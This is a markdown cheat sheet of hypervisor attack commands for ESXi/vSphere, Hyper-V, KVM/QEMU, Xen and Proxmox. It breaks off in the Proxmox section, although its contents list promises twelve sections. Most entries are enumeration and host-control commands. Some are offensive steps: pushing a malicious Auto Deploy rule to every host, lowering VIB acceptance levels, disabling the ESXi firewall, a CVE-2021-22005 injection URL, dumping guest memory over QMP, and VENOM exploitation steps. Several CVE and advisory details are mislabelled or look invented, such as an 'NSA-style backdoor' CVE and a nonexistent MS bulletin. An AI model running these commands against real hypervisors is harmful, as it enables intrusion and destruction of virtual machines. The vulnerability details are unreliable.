# Hypervisor Introspection (VMI) Payloads

> Attack payloads and commands organized by hypervisor family. All commands are for authorized security testing only. Reproduce escape CVEs only in nested lab environments — never against production hypervisor hosts.

---

## Table of Contents

1. [VMware ESXi / vSphere Attacks](#1-vmware-esxi--vsphere-attacks)
2. [Microsoft Hyper-V Attacks](#2-microsoft-hyper-v-attacks)
3. [KVM / QEMU Attacks](#3-kvm--qemu-attacks)
4. [Xen Attacks](#4-xen-attacks)
5. [Proxmox VE Attacks](#5-proxmox-ve-attacks)
6. [VirtualBox / Parallels / Type-2 Attacks](#6-virtualbox--parallels--type-2-attacks)
7. [Virtual Machine Introspection (VMI) for Defense and Offense](#7-virtual-machine-introspection-vmi-for-defense-and-offense)
8. [Hypervisor-based Rootkits and Thin Hypervisors](#8-hypervisor-based-rootkits-and-thin-hypervisors)
9. [Hardware-assisted Virtualization Abuse](#9-hardware-assisted-virtualization-abuse)
10. [VM Memory Forensics](#10-vm-memory-forensics)
11. [Management Plane Protocol Abuse](#11-management-plane-protocol-abuse)
12. [ESXi Ransomware Techniques](#12-esxi-ransomware-techniques)

---

## 1. VMware ESXi / vSphere Attacks

### 1.1 vSphere REST API Enumeration

```bash
# vCenter REST API base - typically /api or /rest depending on version
# vSphere 7.0+ uses /api; 6.x uses /rest
curl -k -X POST https://vcenter.example.com/api/session \
  -H "Content-Type: application/json" \
  -d '{"username":"administrator@vsphere.local","password":"<PASSWORD>"}'
# Returns: {"token":"<TOKEN>"}

# Use the token to enumerate
TOKEN="<TOKEN>"
curl -k https://vcenter.example.com/api/vcenter/host \
  -H "vmware-api-session-id: $TOKEN"
curl -k https://vcenter.example.com/api/vcenter/vm \
  -H "vmware-api-session-id: $TOKEN"
curl -k https://vcenter.example.com/api/vcenter/datastore \
  -H "vmware-api-session-id: $TOKEN"
curl -k https://vcenter.example.com/api/vcenter/network \
  -H "vmware-api-session-id: $TOKEN"

# Legacy /rest endpoint (vSphere 6.5-7.0)
curl -k -X POST https://vcenter.example.com/rest/com/vmware/cis/session \
  -H "Content-Type: application/json" \
  -d '{"username":"administrator@vsphere.local","password":"<PASSWORD>"}'
```

```bash
# govc - the modern VMware CLI (Go-based)
export GOVC_URL='https://vcenter.example.com/sdk'
export GOVC_USERNAME='administrator@vsphere.local'
export GOVC_PASSWORD='<PASSWORD>'
export GOVC_INSECURE=1

govc about                       # vCenter/ESXi version and build
govc datacenter.info             # List all datacenters
govc hosts.info                  # All ESXi hosts
govc vm.info -dc.* '*'           # All VMs across all DCs
govc ls -t Datastore '*'         # All datastores
govc ls -t Network '*'           # All networks (port groups, dVSwitches)
govc find / -type m -guest.toolsRunningToolsStatus toolsNotRunning  # VMs without tools running
```

```python
# pyvmomi - programmatic enumeration of the MOB tree
from pyVim.connect import SmartConnect, Disconnect
from pyVmomi import vim
import ssl

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

si = SmartConnect(
    host='vcenter.example.com',
    user='administrator@vsphere.local',
    pwd='<PASSWORD>',
    sslContext=ctx,
)

content = si.RetrieveContent()
for dc in content.rootFolder.childEntity:
    print(f"DC: {dc.name}")
    for host in dc.hostFolder.childEntity[0].host:
        for h in host:
            print(f"  Host: {h.name} - {h.summary.config.product.version}")

# Walk every VM and dump key attributes
for dc in content.rootFolder.childEntity:
    for vm in dc.vmFolder.childEntity[0].childEntity:
        if isinstance(vm, vim.VirtualMachine):
            print(f"VM: {vm.name} | state={vm.runtime.powerState} | "
                  f"guest={vm.config.guestFullName} | "
                  f"tools={vm.guest.toolsStatus}")
```

### 1.2 Managed Object Browser (MOB) Abuse

```bash
# The MOB is a web UI on ESXi (hostd) and vCenter (vpxd) exposing the entire
# managed object tree. Often left enabled for troubleshooting.
# ESXi: https://<host>/mob
# vCenter: https://<vc>/mob

# Enumerate the root folder
curl -k -u 'root:<PASSWORD>' https://esxi.example.com/mob/?moid=ha-folder-root

# Get the host configManager
curl -k -u 'root:<PASSWORD>' 'https://esxi.example.com/mob/?moid=ha-host&doPath=configManager'

# Read the advanced options (often contains credentials in plaintext)
curl -k -u 'root:<PASSWORD>' 'https://esxi.example.com/mob/?moid=ha-host&doPath=config.option'

# Disable MOB after testing (defensive)
# ESXi Advanced Option:
vim-cmd hostsvc/advopt/view Config.HostAgent.plugins.solo.enableMob
vim-cmd hostsvc/advopt/update Config.HostAgent.plugins.solo.enableMob string false
```

### 1.3 SLP Fingerprinting (CVE-2019-5544, CVE-2020-3992, CVE-2021-21974)

```bash
# OpenSLP ships on ESXi for service discovery on UDP 427
# CVE-2019-5544: OpenSLP heap overflow (CVSS 9.8) in ESXi 6.7/6.5
# CVE-2020-3992: OpenSLP use-after-free (CVSS 9.8) in ESXi 7.0
# CVE-2021-21974: OpenSLP heap overflow (CVSS 9.8) in ESXi 7.0/6.7/6.5
#                   -> Used by ESXiArgs ransomware in Feb 2023

# Enumerate SLP services (legitimate reconnaissance)
nmap -sU --script=slp-systeminfo -p 427 <target>
nmap -sU --script=slp-enum-services -p 427 <target>
# Tools: slptool, slp_windows from OpenSLP project

slptool -u <target> findsrvtypes
slptool -u <target> findsrvs service:service-agent
slptool -u <target> findsrvs service:directory-agent

# ESXiArgs 2023 IoCs: suspicious /tmp/* processes, /store/packages lost,
# .vmdk renamed to .vmdk.esxargs, ransom note /etc/motd

# Defensive: disable SLP on ESXi (recommended unless actively used)
/etc/init.d/slpd stop
esxcli network firewall rulesheet set -r slp -e false
chkconfig slpd off
```

### 1.4 ESXi Shell / DCUI / DCUI Direct

```bash
# After enabling ESXi Shell (either via DCUI, vSphere Client, or vMA):
vim-cmd vmsvc/getallvms              # List all VMs with VMID
vim-cmd vmsvc/power.get <VMID>       # Power state
vim-cmd vmsvc/power.off <VMID>       # Hard power off
vim-cmd vmsvc/power.suspend <VMID>   # Suspend (used by ransomware)
vim-cmd vmsvc/snapshot.create <VMID> <name> <desc>  # Snapshot
vim-cmd vmsvc/unregister <VMID>      # Unregister VM (keeps disk)
vim-cmd vmsvc/destroy <VMID>         # Delete VM and disks

# Host-level operations
esxcli system version get            # Build number, patch level
esxcli network ip connection list    # Active TCP connections (look for C2)
esxcli storage vmfs extent list      # List VMFS datastores
esxcli storage core device list      # List all LUNs
esxcli system process list           # All host processes
esxcli network firewall ruleset list # Firewall rules
esxcli network firewall set -e false # Disable entire firewall (DANGER)

# vmktools - low-level disk and memory tools
vmkfstools -P /vmfs/volumes/datastore1  # Datastore geometry
vmkfstools -D /vmfs/volumes/datastore1/file.vmdk  # Lock info
vmkfstools -i src.vmdk -d thin dst.vmdk  # Clone with thin provisioning
```

### 1.5 vmkloadapp Abuse (Custom VIB Loading)

```bash
# vmkloadapp loads user-world binaries into the vmkernel address space.
# An attacker with root on ESXi can build a custom VIB that installs
# a binary running in vmkernel context (effectively kernel mode on ESXi).

# Inspect installed VIBs
esxcli software vib list

# Install a custom VIB (signed) - requires acceptance level check
esxcli software vib install -d /tmp/custom.vib
esxcli software acceptance set --level=CommunitySupported  # Lower bar

# Reverse engineer a VIB (offline)
ar x custom.vib           # VIB is an AR archive containing descriptor.xml + payload
tar xvf payload.tar       # Contains the actual files

# Build a VIB (lab - reproduce malicious VIB behavior)
# Reference: https://github.com/vmware/open-vm-tools - sdk toolchain
fallocate -l 1M payload.tar
vibauthor -C descriptor.xml -v payload.tar -s custom.vib
```

### 1.6 VMDK Manipulation

```bash
# VMDK is the VMware virtual disk format (two files: descriptor .vmdk + extent -flat.vmdk)
# Read VMDK descriptor (human-readable)
head -20 disk.vmdk
# RW 83886080 VMFS "disk-flat.vmdk"
# ddb.adapterType = "lsilogic"
# ddb.geometry.cylinders = "5221"
# ddb.geometry.heads = "255"
# ...

# Mount VMDK read-only on ESXi
vmkfstools -r /vmfs/volumes/ds/disk.vmdk /vmfs/volumes/ds/clone.vmdk

# Mount VMDK on a Linux host with qemu-tools
qemu-nbd -c /dev/nbd0 disk.vmdk
mount -o ro /dev/nbd0p1 /mnt/vmdk
# ... inspect /mnt/vmdk ...
umount /mnt/vmdk
qemu-nbd -d /dev/nbd0

# Tampering with VMDK descriptor (offline attack)
# - Rename adapterType to bypass certain guest tools detections
# - Modify ddb.uuid to clone identity
# - Adjust geometry to break certain forensic tools

# Defensive: vTPM + vSB detects VMDK tampering when guest boots
# Audit VMDK descriptor changes:
sha256sum /vmfs/volumes/datastore1/*/disk.vmdk > /root/vmdk_hashes.txt
```

### 1.7 vSphere Auto Deploy Persistence

```bash
# Auto Deploy provisions ESXi hosts over PXE on every boot.
# An attacker who compromises the Auto Deploy server can push a malicious
# image to every host in the cluster.

# Inspect the Auto Deploy rules
Get-DeployRule                       # PowerCLI
Get-DeployRuleSet                    # Active rule set
New-DeployRule -Name "Evil" -Item "evil-host-profile","evil-image" -AllHosts
Add-DeployRule -DeployRule "Evil"

# Defensive: place Auto Deploy server on isolated management VLAN,
# sign image profiles, monitor for rule changes.
```

### 1.8 SSO and vCenter Single Sign-On Abuse

```bash
# Default SSO admin: administrator@vsphere.local (vsphere.local domain)
# Common mistake: ssodomain admin == domain admin in customer AD

# List SSO users and groups via dir-cli (on vCenter shell)
/usr/lib/vmware-vmafd/bin/dir-cli user list --login administrator@vsphere.local
/usr/lib/vmware-vmafd/bin/dir-cli group list --login administrator@vsphere.local
/usr/lib/vmware-vmafd/bin/dir-cli group findbydn --dn cn=Administrators,...

# Reset SSO admin password (requires vCenter root SSH)
/usr/lib/vmware-vmafd/bin/vmafd-cli set-dir-pwd --pwd <new> --login administrator@vsphere.local

# Defensive: enable vSphere Lockdown Mode (Strict) to require vCenter mediation
vim-cmd hostsvc/enable_lockdown
```

### 1.9 vMA (vSphere Management Assistant)

```bash
# vMA is a Linux appliance with pre-installed vCLI tools. Old but still present.
# Default user: vi-admin
# Common misconfig: shared SSH key across multiple vMA appliances

# After SSH to vMA as vi-admin:
vifs --server esxi.example.com --username root --password <PW> --dir '[datastore1]'
vicfg-ntp --server esxi.example.com --username root --password <PW> --list
vicfg-route --server esxi.example.com --username root --password <PW> --list

# Defensive: rotate vi-admin SSH keys, restrict vMA network access.
```

### 1.10 CVE-Specific VMware Checks

```bash
# CVE-2021-21974 (OpenSLP RCE, ESXiArgs) - check SLP exposure
nmap -sU -p 427 --script slp-systeminfo <target>
# Patched in ESXi 7.0 U2c, 6.7 U3o, 6.5 U3q

# CVE-2020-3992 (OpenSLP use-after-free) - ESXi 7.0 before U2c
# CVE-2019-5544 (OpenSLP heap overflow) - ESXi 6.7 before U3
esxcli system version get | grep -i build
# Compare build against VMware patch matrix

# CVE-2020-4004 (vSphere NSA-style backdoor, CVSS 9.1) - vCenter plugin
# CVE-2020-4005 (vCenter reverse proxy DoS, CVSS 7.5)
# Both: patch vCenter to 7.0 U1c / 6.7 U3n

# CVE-2021-22005 (vCenter analytics RCE, CVSS 9.8) - logupload path
curl -k -v 'https://vc.example.com/analytic/vphash/healthmsg/<INJECT>'
# Patched in vCenter 7.0 U2a / 6.7 U3p

# CVE-2022-31656 (vCenter SSO auth bypass, CVSS 9.8)
# Auth bypass via malformed SSO endpoint. Patched in 7.0 U3g / 6.7 U3t
```

---

## 2. Microsoft Hyper-V Attacks

### 2.1 VMWP.exe Worker Process Enumeration

```powershell
# Each running VM has a VMWP.exe (Virtual Machine Worker Process) on the host
Get-Process vmwp | Select Id, ProcessName, StartTime, @{N='VM';E={
    (Get-VM | Where-Object { $_.Id -eq (Get-WmiObject -Namespace root\virtualization\v2 `
      -Class Msvm_ComputerSystem -Filter "ProcessId=$($_.Id)").Name }}
}

# Map VMWP -> VM via the WMI namespace
Get-WmiObject -Namespace root\virtualization\v2 -Class Msvm_ComputerSystem |
  Select ElementName, ProcessId, EnabledState

# List all loaded modules inside a specific VMWP (check for vulnerable versions)
$vmwpPid = (Get-Process vmwp | Where-Object { $_.Id -eq <PID> }).Id
Get-Process -Id $vmwpPid | Select-Object -ExpandProperty Modules |
  Select ModuleName, FileName, FileVersion

# Defensive: monitor VMWP for unexpected child processes (sign of escape)
Get-WmiObject Win32_Process -Filter "Name='vmwp.exe'" |
  ForEach-Object { Get-WmiObject Win32_Process -Filter "ParentProcessId=$($_.ProcessId)" }
```

### 2.2 VMBus and Virtualization Drivers

```powershell
# VMBus is the paravirtualized communication channel between guest and host
# Host drivers: vmbus.sys, vid.sys (Virtualization Infrastructure Driver),
#              hvp.sys (Hypervisor Platform), vmms.exe (VM Management Service)

# Check hypervisor present flag
systeminfo | findstr /i "Hyper-V"
# Output: "A hypervisor has been detected. Features required for Hyper-V..."

# Check if running as guest (root partition vs guest partition)
# CPUID leaf 0x40000003 returns hypervisor feature bits
# Bit 12 (Hyperpresent) is set if Hyper-V is active
(Get-WmiObject Win32_ComputerSystem).HypervisorPresent

# Driver versions (check against MSRC bulletins)
driverquery /v | findstr /i "vmbus vid hvp"
Get-WmiObject Win32_SystemDriver -Filter "Name='vmbus'" |
  Select Name, PathName, State, StartMode

# Enumerate virtualization-based security (VBS) state
# VBS uses Hyper-V's Virtual Secure Mode (VSM) to host secure kernel (VTL1)
$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\Microsoft\Windows\DeviceGuard'
$dg.AvailableSecurityProperties        # Hardware properties
$dg.SecurityServicesConfigured        # 1 = Credential Guard, 2 = HVCI
$dg.SecurityServicesRunning           # What's actually running
```

### 2.3 WMI Interface Enumeration

```powershell
# Hyper-V WMI provider in root\virtualization\v2
Get-WmiObject -Namespace root\virtualization\v2 -List | Where-Object { $_.Name -like 'Msvm_*' }

# List virtual switches and ports
Get-WmiObject -Namespace root\virtualization\v2 -Class Msvm_VirtualEthernetSwitch

# List virtual hard disks (VHD/VHDX) on the host
Get-ChildItem -Path D:\VMs -Recurse -Include *.vhd,*.vhdx |
  ForEach-Object { Get-VHD -Path $_.FullName | Select Path, VhdFormat, VhdType, FileSize }

# Inspect a VHDX offline (read-only mount)
Mount-VHD -Path D:\VMs\vm1.vhdx -ReadOnly -Passthru | Get-Disk
# Inspect-Filesystem...
Dismount-VHD -Path D:\VMs\vm1.vhdx
```

### 2.4 Live Migration Interception

```powershell
# Live Migration moves a running VM between Hyper-V hosts over TCP 6600 (LM) / 443 (CSV)
# Default auth: Kerberos (constrained delegation) or CredSSP
# Misconfig 1: auth = NULL (cleartext)
# Misconfig 2: LM network reachable from guest subnet

# Enumerate Live Migration network config
Get-ClusterNetwork | Select Name, Address, Role, State
Get-VMHost | Select Name, VirtualHardDiskPath, VirtualMachinePath

# Check Live Migration performance options (SMB, Compression, TCP)
Get-VMHost | Select Name, VirtualMachineMigrationPerformanceOptions

# Defensive: isolate LM network on a non-routable VLAN, require Kerberos,
# and restrict the migration scope:
Set-VMHost -UseAnyNetworkForMigration $false
Set-VMHost -VirtualMachineMigrationAuthType Kerberos
```

### 2.5 Shielded VM Bypass Research

```powershell
# Shielded VMs protect against fabric admin tampering. The bypass target is
# typically the Host Guardian Service (HGS), not the VM itself.

# Check HGS attestation mode (TPM-trusted vs AD-admin trusted)
Get-HgsServerConfiguration

# List shielded VMs on a host
Get-VM | Where-Object { $_.IsShielded }

# Attempt to disable shielding (requires fabric admin + healthy HGS)
Set-VMKeyProtector -VMName <vm> -KeyProtector <newKP>
# The HGS will refuse to issue a key if the host fails attestation.

# Bypass research targets:
# 1. Compromise HGS itself (often a domain controller)
# 2. TPM-firmware vulnerability that lets host fake measured boot
# 3. RDP-within-Shielded-VM tunneling to exfiltrate data
# 4. BitLocker bypass via DMA on the host (VM passes-through PCIe DMA-capable device)

# Defensive: separate HGS domain from production AD, enable TPM 2.0 attestation,
# audit shielded VM key release events in HGS event log.
```

### 2.6 Hyper-V-Specific CVEs

```powershell
# CVE-2017-0180 / MS17-0113 - Hyper-V vmbus.sys buffer overflow (guest -> host RCE)
# Check: Build number vs MS patch matrix
[System.Environment]::OSVersion.Version

# CVE-2018-8439 - Hyper-V Denial of Service (guest -> host crash via vmbus)
# CVE-2019-0628 - Hyper-V vmbus info disclosure
# CVE-2019-0719 - Hyper-V vmbus DoS
# CVE-2020-0663 - Hyper-V vmbus RCE
# CVE-2021-28472 - Hyper-V vmbus RCE
# CVE-2022-21904 - Hyper-V vmbus info disclosure
# CVE-2023-21558 - Hyper-V vmbus RCE

# Patch verification
Get-HotFix | Where-Object { $_.Description -eq "Security Update" } | Sort InstalledOn -desc
```

---

## 3. KVM / QEMU Attacks

### 3.1 QEMU Monitor Protocol (QMP)

```bash
# QMP is the JSON-based control protocol for QEMU.
# Often exposed on TCP/Unix socket during debugging or even in production
# (e.g., some Docker Desktop / libvirt configurations).

# Connect via TCP
qmp-shell 127.0.0.1:4444
# Or directly with nc / socat
echo '{"execute":"qmp_capabilities"}' | nc 127.0.0.1 4444

# Common QMP commands
{"execute":"qmp_capabilities"}
{"execute":"query-status"}
{"execute":"query-name"}
{"execute":"query-uuid"}
{"execute":"query-version"}
{"execute":"query-kvm"}
{"execute":"query-chardev"}
{"execute":"query-block"}
{"execute":"query-pci"}
{"execute":"query-cpus-fast"}
{"execute":"human-monitor-command","arguments":{"command-line":"info kvm"}}

# Power operations
{"execute":"system_powerdown"}    # ACPI shutdown
{"execute":"system_reset"}        # Hard reset
{"execute":"quit"}                # Stop QEMU

# Memory inspection (huge attack surface!)
{"execute":"human-monitor-command","arguments":{"command-line":"xp /16gx 0xfffff000"}}
{"execute":"pmemsave","arguments":{"val":4096,"size":65536,"filename":"dump.bin"}}
{"execute":"memsave","arguments":{"val":0,"size":65536,"filename":"vmem.bin"}}

# Attacker can use QMP to dump the entire guest RAM from outside the guest
# without the guest knowing. This is a forensic feature, but if QMP is
# reachable from the guest network, it's also an escape primitive.
```

```bash
# Launch QEMU with QMP exposed on TCP for lab use
qemu-system-x86_64 \
  -enable-kvm -m 2048 -smp 2 \
  -hda disk.qcow2 \
  -netdev user,id=net0 -device virtio-net,netdev=net0 \
  -qmp tcp:127.0.0.1:4444,server,nowait \
  -vnc :0 \
  -monitor none

# Connect with python-qmp
pip3 install qemu.qmp.oui
python3 -c "
import asyncio
from qemu.qmp import QMPClient
async def main():
    qmp = QMPClient('lab')
    await qmp.connect(('127.0.0.1', 4444))
    print(await qmp.execute('query-status'))
    await qmp.disconnect()
asyncio.run(main())
"
```

### 3.2 VENOM (CVE-2015-3456) Reproduction

```bash
# CVE-2015-3456 (VENOM - Virtual Environment Neglected Operations Manipulation)
# Buffer overflow in QEMU floppy disk controller emulation (hw/fdc.c)
# Reachable from any guest with a virtual floppy (default until QEMU 2.3)
# Affects: QEMU <= 2.3.1, Xen, KVM, VirtualBox (older), Bochs
# CVSS 9.3 (was originally 10.0 in some scorings)
# Disclosed by Jason Geffner (CrowdStrike)

# Build a vulnerable QEMU (lab)
git clone https://gitlab.com/qemu-project/qemu.git
cd qemu && git checkout v2.3.0
./configure --target-list=x86_64-softmmu --enable-debug
make -j$(nproc)

# Launch with floppy device
./x86_64-softmmu/qemu-system-x86_64 \
  -m 256 -hda disk.img \
  -fda empty.img \
  -monitor stdio

# PoC (from inside guest - assembly or kernel module)
# 1. Reset FDC: out 0x3f2, 0x00
# 2. Issue READ_ID command with a crafted track > 79 (default max)
# 3. The FDC copies data into a fixed-size buffer without bounds check
# 4. Overwrite adjacent heap -> heap spraying -> RCE in qemu-system

# Reproduce with the public PoC (search for "VENOM PoC" on GitHub)
# Patched in QEMU 2.3.1+; modern QEMU has the floppy device off by default.
# Disable defensively:
qemu-system-x86_64 ... -nodefaults   # No default devices
qemu-system-x86_64 ... -global isa-fdc.driveA=
```

### 3.3 Other QEMU Device Emulation CVEs

```bash
# CVE-2015-7504 - PCNET card buffer overflow (hw/net/pcnet.c)
# Reachable from any guest with -device pcnet
# PoC: send a malformed loopback packet that overflows a buffer
qemu-system-x86_64 -device pcnet  # vulnerable

# CVE-2015-7512 - PCNET negative-length read
# CVE-2016-2392 - QEMU usb-net heap overflow
# CVE-2017-5526 - QEMU nbd-server logical error
# CVE-2017-5898 - QEMU usb redirection heap overflow
# CVE-2020-14364 - QEMU USB XHCI out-of-bounds read (CVSS 8.5)
#    Affects every QEMU with -device qemu-xhci
#    PoC: malformed USB packet from guest triggers OOB in host's usb-storage
# CVE-2020-15863 - QEMU XDP packets with invalid length in e1000e
# CVE-2021-3947 - QEMU e1000e out-of-bounds write (CVSS 7.0)
# CVE-2021-20221 - QEMU vhost-user-gpu virtio-gpu OOB read
# CVE-2023-3354 - QEMU OCI jobs overflow (heap overflow in jobs.c)

# Audit running QEMU instances for known-vulnerable devices
ps aux | grep qemu-system
for pid in $(pgrep qemu-system); do
    echo "--- PID $pid ---"
    cat /proc/$pid/cmdline | tr '\0' '\n' | grep -E 'device|netdev|usb'
done

# Defensive: use -nodefaults, only attach devices you actually need,
# run qemu-system as unprivileged user, behind seccomp.
```

### 3.4 virtio Backend Issues

```bash
# virtio is the paravirtualized device family: virtio-net, virtio-blk,
# virtio-scsi, virtio-gpu, virtio-balloon, virtio-console, virtio-rng.
# Each has a host-side backend (vhost-net kernel module, or userland vhost-user-*).

# vhost-net (in-kernel accelerator) historically had multiple CVEs:
# CVE-2018-3626 (L1TF via vhost-net), CVE-2019-7308, CVE-2021-46910

# Inspect virtio devices inside a Linux guest
lspci | grep -i virtio
ls /sys/bus/virtio/devices/

# Virtio-blk: read raw disk through virtio backend
cat /sys/block/vda/device/model
# Exploit path: malformed virtio descriptor from guest -> vring heap overflow
# in vhost-net kernel module on host -> host kernel LPE.

# vhost-user-gpu / vhost-user-vsock: more recent attack surface, especially
# in Kata Containers and Firecracker.

# Defensive:
# - Prefer vhost-net over virtio-net userland backend (faster but bugs in vhost-net
#   are kernel-mode).
# - Patch host kernel aggressively (vhost-* bugs are usually fixed in stable kernels).
# - Use vIOMMU + IOMMU groups to isolate virtio devices from DMA-based attacks.
```

### 3.5 PCI Passthrough Attacks

```bash
# PCI passthrough (vfio-pci) gives a guest direct access to a physical device.
# Risks:
#   1. The guest can DMA into host memory unless IOMMU isolates properly.
#   2. IOMMU is complex; misconfiguration allows DMA escape.
#   3. SR-IOV virtual functions have shared firmware; bugs affect all VFs.

# Enumerate IOMMU groups on host
for d in /sys/kernel/iommu_groups/*/devices/*; do
    n=${d#*/iommu_groups/*}; n=${n%%/*}
    printf 'IOMMU Group %s %s\n' "$n" "${d##*/}"
done

# Assign a GPU to a guest via vfio-pci
# Host kernel cmdline: intel_iommu=on iommu=pt
# /etc/modprobe.d/vfio.conf:
#   options vfio-pci ids=10de:1b80,10de:10f0
# modprobe vfio-pci

virsh nodedev-list --tree | grep -i pci
virsh nodedev-dumpxml pci_0000_01_00_0

# Defensive: enable IOMMU strict mode, audit vfio-pci assignments,
# prefer SR-IOV over whole-device passthrough when possible.
```

### 3.6 KVM Nested Virtualization

```bash
# Enable nested on Intel (host kernel module param)
echo "options kvm-intel nested=1" | sudo tee /etc/modprobe.d/kvm-intel.conf
sudo modprobe -r kvm-intel && sudo modprobe kvm-intel
cat /sys/module/kvm_intel/parameters/nested   # Should be Y or 1

# AMD equivalent
echo "options kvm-amd nested=1" | sudo tee /etc/modprobe.d/kvm-amd.conf

# In the guest, expose VMX/SVM to nested hypervisor
<cpu mode='host-passthrough'>
  <feature policy='require' name='vmx'/>
</cpu>
# Or for AMD:
  <feature policy='require' name='svm'/>

# Use case: reproduce hypervisor escapes inside a nested VM safely
```

---

## 4. Xen Attacks

### 4.1 Xen Toolstack (xl)

```bash
# xl is the modern Xen toolstack; xe is the Citrix XenServer/XCP-ng CLI

# Enumeration
xl info                          # Host info (Xen version, cpus, memory)
xl list                          # All domains
xl sched-credit                 # Scheduler config
xl network-list <domid>         # Network interfaces
xl block-list <domid>           # Block devices
xl vcpu-list                    # All vCPUs across domains
xl debug-keys h                 # Dump host state (debug only)

# Power operations
xl create <config.cfg>          # Create from config file
xl shutdown <domid>             # Graceful
xl destroy <domid>              # Hard kill
xl suspend <domid>              # Suspend to disk
xl migrate <domid> <dest-host>  # Live migration

# Inspect a domain's config
xl list -l <domid> | less

# XenStore - the shared config DB between Dom0 and DomUs
xenstore-ls                     # Dump entire xenstore tree
xenstore-read <path>            # Read a specific key
xenstore-write <path> <val>     # Write (permissions permitting)
xenstore-chmod <path> <perms>   # Change permissions (Dom0 only usually)
```

### 4.2 PV vs HVM Guests

```bash
# PV (Paravirtualized) guests are aware of Xen and use hypercalls.
# HVM (Hardware Virtual Machine) guests use Intel VT-x/AMD-V transparently.
# PV guests have a larger attack surface (grant tables, event channels, xenbus).

# Check guest type
xl info | grep -i caps
# xen_caps: xen-3.0-x86_64 xen-3.0-x86_32p hvm-3.0-x86_32 hvm-3.0-x86_64

# List PV guests (no 'hvm' in config)
for d in $(xl list | awk 'NR>2{print $2}'); do
    cfg=$(xl list -l $d | grep -E '"type"')
    echo "$d: $cfg"
done

# PV guest config (example)
cat > /etc/xen/pv-guest.cfg <<EOF
name = "pv-guest"
memory = 1024
vcpus = 2
kernel = "/boot/vmlinuz-xen"
ramdisk = "/boot/initramfs-xen"
extra = "root=/dev/xvda1 console=hvc0"
disk = ['phy:/dev/vg0/pv-guest,xvda,w']
vif = ['bridge=xenbr0']
EOF

# HVM guest config
cat > /etc/xen/hvm-guest.cfg <<EOF
name = "hvm-guest"
memory = 2048
vcpus = 2
builder = "hvm"
device_model_version = "qemu-xen"
boot = "c"
disk = ['phy:/dev/vg0/hvm-guest,xvda,w']
vif = ['bridge=xenbr0']
EOF
```

### 4.3 XSA-Series Exploitation

```bash
# Xen Security Advisories - https://xenbits.xen.org/xsa/
# Notable XSAs relevant to escape:

# XSA-148 (CVE-2015-7812) - PV guest privilege escalation via MMIO
# Affects: Xen 4.0+ PV guests
# Patched: Xen 4.1.6.1-l, 4.2.4.3-l, 4.3.3.2-l, 4.4.2.1-l

# XSA-155 (VENOM, CVE-2015-3456) - same QEMU floppy bug, but on Xen's qemu-dp

# XSA-182 (CVE-2016-6258) - PV guest root -> Dom0 via invalid pointer
# Affects: Xen 4.0-4.7

# XSA-242 (CVE-2017-12137) - PV block backend grant table issue
# Affects: Xen 4.5-4.9

# XSA-253 (CVE-2017-15592) - x86 PV guest OS bypass via pagetable update
# Affects: Xen 4.0-4.9

# XSA-289 (CVE-2018-15469) - x86 HVM guest DoS via corrupt PIT state
# XSA-345 (CVE-2020-29479) - ARM denial of service via cache flushing
# XSA-392 (CVE-2021-28693) - x86 IOMMU page-table entry issue
# XSA-390 (CVE-2021-28692) - PV devicePassthrough escalation
# XSA-417 (CVE-2022-26362) - PV guest -> Dom0 via grant table race
# XSA-419 (CVE-2022-26365) - HVM PVH guest -> hypervisor
# XSA-424 (CVE-2022-33745) - HVM guest mapping leak

# Patch audit
xl info | grep xen_changeset
xen-detect                        # Print running Xen version (in Dom0)

# Defensive: enable XSM-FLASK policy, run Dom0 as a separate minimal domain,
# avoid PV guests in favor of PVH (PV-on-HVM hybrid).
```

### 4.4 Grant Table and Event Channel Abuse

```bash
# Grant tables: mechanism for a DomU to share memory with Dom0 or another DomU
# Event channels: notification mechanism for grant setup and device I/O

# List active grants (Dom0 only)
xl debug-keys g         # Dump grant table state
cat /var/log/xen/xend-debug.log | grep -A 20 'grant'

# A common PV escape pattern:
# 1. Compromise DomU kernel
# 2. Issue malformed grant table operations (GNTTABOP_setup / unmap_grant_ref)
# 3. Race against Dom0 backend -> kernel info leak or use-after-free in Dom0
# 4. Dom0 LPE -> pivot to sibling VMs via block backend

# Mitigation: PV guests are legacy; migrate to PVH (PV-on-HVM) for safety
xl info | grep pvh_enabled
```

### 4.5 Xen Security Modules (XSM-FLASK)

```bash
# XSM with FLASK policy enforces MAC between domains.
# Default policy is "dummy" - permits everything between Dom0 and DomUs.

# Check current policy
xl info | grep -i xsm
# Or:
cat /proc/xen/xsm

# If FLASK is enabled, list policy
xl flask_label <domid>
xl flask_list

# Enable FLASK (boot-time):
# Add to grub: flask=enforcing
# Policy file: /boot/xenpolicy.24
# Build policy: checkpolicy -M -c 32 -o xenpolicy.24 policy.conf

# Defensive: enforce strict policy that denies Dom0 -> DomU memory access
# except for explicit device passthrough.
```

---

## 5. Proxmox VE Attacks

### 5.1 Proxmox Web UI and API

```bash
# Proxmox VE ships pveproxy (Apache-based) on TCP 8006
# API is RESTful with ticket-based auth

# Authenticate (PAM realm)
curl -k -X POST https://pve.example.com:8006/api2/json/access/ticket \
  -d "username=root@pam" \
  -d "password=<PASSWORD>" \
  -d "otpfield=<OTP if TOTP>"
# Returns: {"data":{"ticket":"...","CSRFPreventionToken":"..."}}

# Use the ticket
TICKET="<TICKET>"
CSRF="<CSRF>"
curl -k https://pve.example.com:8006/api2/json/version \
  -b "PVEAuthCookie=$TICKET"
curl -k https://pve.example.com:8006/api2/json/nodes \
  -b "PVEAuthCookie=$TICKET"
curl -k https://pve.example.com:8006/api2/json/nodes/<node>/qemu \
  -b "PVEAuthCookie=$TICKET"
curl -k https://pve.example.com:8006/api2/json/nodes/<node>/lxc \
  -b "PVEAuthCookie=$TICKET"

# CLI equivalent
pvesh get /nodes
pvesh get /nodes/<node>/qemu
pvesh get /storage

# Defensive: enable 2FA for root@pam, restrict 8006 to management VLAN,
# rotate PVE Auth keys.
```

### 5.2 KVM Guests via qm

```bash
# qm is the Proxmox VE KVM management CLI
qm list                         # All VMs on this node
qm config <vmid>                # VM config (similar to xl/xenstore)
qm status <vmid>                # Power state
qm showcmd <vmid>               # Show QEMU command line (reveals devices)
qm monitor <vmid>               # Drop into QEMU HMP monitor
qm guest cmd <vmid> ping        # qemu-guest-agent ping
qm guest exec <vmid> -- ls /    # Execute inside guest (needs guest-agent)

# Snapshot operations
qm snapshot <vmid> <name>
qm snapshot <vmid> <name> --vmstate 0   # Disk-only
qm rollback <vmid> <name>
